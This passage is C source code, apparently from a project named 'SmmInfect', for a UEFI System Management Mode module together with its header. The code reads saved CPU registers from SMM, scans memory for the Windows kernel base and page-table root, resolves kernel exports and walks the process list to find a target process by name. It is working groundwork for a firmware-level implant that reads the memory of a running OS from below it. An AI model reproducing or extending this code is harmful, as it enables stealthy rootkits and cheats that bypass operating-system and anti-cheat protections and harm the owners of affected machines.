    PsGetProcessSectionBaseAddress = ReadVirtual32(ZGetWindowsProcAddressX64(KernelCr3, KernelBase, "PsGetProcessSectionBaseAddress") + 3, KernelCr3);
    PsGetProcessExitProcessCalled = ReadVirtual32(ZGetWindowsProcAddressX64(KernelCr3, KernelBase, "PsGetProcessExitProcessCalled") + 2, KernelCr3);
    PsGetProcessImageFileName = ReadVirtual32(ZGetWindowsProcAddressX64(KernelCr3, KernelBase, "PsGetProcessImageFileName") + 3, KernelCr3);
    ActiveProcessLinks = ReadVirtual32(ZGetWindowsProcAddressX64(KernelCr3, KernelBase, "PsGetProcessId") + 3, KernelCr3) + 8;
    PsGetProcessPeb = ReadVirtual32(ZGetWindowsProcAddressX64(KernelCr3, KernelBase, "PsGetProcessPeb") + 3, KernelCr3);

    if (!PsInitialSystemProcess || !PsGetProcessExitProcessCalled || !PsGetProcessImageFileName || !ActiveProcessLinks || !PsGetProcessPeb || !PsGetProcessSectionBaseAddress)
    {
        return EFI_NOT_FOUND;
    }

    SetupDone = TRUE;
    return EFI_SUCCESS;
}

// credits ekknod
UINT64 GetWindowsEProcess(char* process_name)
{

    if (EFI_ERROR(SetupWindows(Cpu, GSmst2)))
    {
        return 0;
    }

    UINT64 entry;
    char name[15] = { 0 };

    UINT64 proc = ReadVirtual64(PsInitialSystemProcess, KernelCr3);
    entry = proc;
    do
    {
        ReadVirtual(entry + PsGetProcessImageFileName, KernelCr3, (UINT8*)name, 15);
        name[14] = 0;
        process_name[14] = 0;

        UINT32 exitcalled = ReadVirtual32(entry + PsGetProcessExitProcessCalled, KernelCr3);
        exitcalled = exitcalled >> 2;
        exitcalled = exitcalled & 1;

        if (!exitcalled && !StrCmpi(name, process_name))
            return entry;

        entry = ReadVirtual64(entry + ActiveProcessLinks, KernelCr3);
        if (entry == 0)
            break;

        entry = entry - ActiveProcessLinks;

    } while (entry != proc);
    return 0;
}


EFI_STATUS MemGetKernelCr3(UINT64* cr3)
{
    if (cr3 == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }

    UINT64 rip;
    UINT64 tempcr3;
    Cpu->ReadSaveState(Cpu, sizeof(tempcr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, GSmst2->CurrentlyExecutingCpu, (VOID*)&tempcr3);
    Cpu->ReadSaveState(Cpu, sizeof(rip), EFI_SMM_SAVE_STATE_REGISTER_RIP, GSmst2->CurrentlyExecutingCpu, (VOID*)&rip);

    UINT64 kernel_entry = rip & ~(SIZE_2MB - 1);

    for (UINT16 i = 0; i < 0x30; i++)
    {
        UINT64 address = kernel_entry - (i * SIZE_2MB);
        UINT64 address2 = kernel_entry + (i * SIZE_2MB);

        if (ReadVirtual16(address, tempcr3) == 23117)
        {
            *cr3 = tempcr3;
            return EFI_SUCCESS;
        }

        if (ReadVirtual16(address2, tempcr3) == 23117)
        {
            *cr3 = tempcr3;
            return EFI_SUCCESS;
        }
    }

    return EFI_NOT_FOUND;
}

EFI_STATUS MemGetKernelBase(UINT64* base)
{
    if (base == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }

    UINT64 rip;
    UINT64 cr3;
    Cpu->ReadSaveState(Cpu, sizeof(cr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, GSmst2->CurrentlyExecutingCpu, (VOID*)&cr3);
    Cpu->ReadSaveState(Cpu, sizeof(rip), EFI_SMM_SAVE_STATE_REGISTER_RIP, GSmst2->CurrentlyExecutingCpu, (VOID*)&rip);

    UINT64 kernel_entry = rip & ~(SIZE_2MB - 1);

    for (UINT16 i = 0; i < 0x30; i++)
    {
        UINT64 address = kernel_entry - (i * SIZE_2MB);
        UINT64 address2 = kernel_entry + (i * SIZE_2MB);

        if (ReadVirtual16(address, cr3) == 23117)
        {
            *base = address;
            return EFI_SUCCESS;
        }

        if (ReadVirtual16(address2, cr3) == 23117)
        {
            *base = address2;
            return EFI_SUCCESS;
        }
    }

    return EFI_NOT_FOUND;
}

```

`SmmInfect/windows.h`:

```h
#pragma once
#include <Uefi.h>
#include <Protocol/SmmBase2.h>
#include <PiSmm.h>
#include <Protocol/SmmCpu.h>

EFI_STATUS SetupWindows(EFI_SMM_CPU_PROTOCOL* cpu, EFI_SMM_SYSTEM_TABLE2* smst);

UINT64 ZGetWindowsProcAddressX64(UINT64 cr3, UINT64 base, const char* export_name);
UINT64 GetWindowsEProcess(char* process_name);
UINT64 GetWindowsBaseAddressModuleX64(UINT64 eprocess, unsigned short* process_name);
UINT64 GetWindowsSectionBaseAddressX64(UINT64 eprocess, UINT64 module_base, unsigned char* section_name);

UINT64 GetWindowsKernelBase();
UINT64 GetWindowsKernelCr3();

UINT64 GetWindowsProcessCr3(UINT64 eprocess);
UINT64 GetWindowsProcessPEB(UINT64 eprocess);
UINT64 GetWindowsProcessBaseAddress(UINT64 eprocess);

```